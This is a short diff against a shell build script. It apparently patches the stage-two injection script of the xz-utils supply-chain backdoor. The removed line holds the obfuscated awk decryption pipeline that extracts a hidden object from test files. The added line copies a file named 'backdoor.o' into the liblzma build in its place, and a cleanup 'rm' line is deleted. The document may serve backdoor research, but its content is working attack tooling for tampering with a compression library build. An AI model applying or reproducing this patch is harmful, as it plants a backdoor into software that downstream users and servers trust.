@@ -1,0 +1,18 @@
+diff --git a/script.sh b/script.sh
+index 718dd56..885b7d4 100644
+--- a/script.sh
++++ b/script.sh
+@@ -206,7 +206,7 @@ else
+ N=88664
+ W=0
+ fi
+-xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
++cp ../../backdoor.o liblzma_la-crc64-fast.o
+ if ! test -f liblzma_la-crc64-fast.o; then
+ exit 0
+ fi
+@@ -243,6 +243,6 @@ fi
+ else
+ mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+ fi
+-rm -f liblzma_la-crc64-fast.o || true
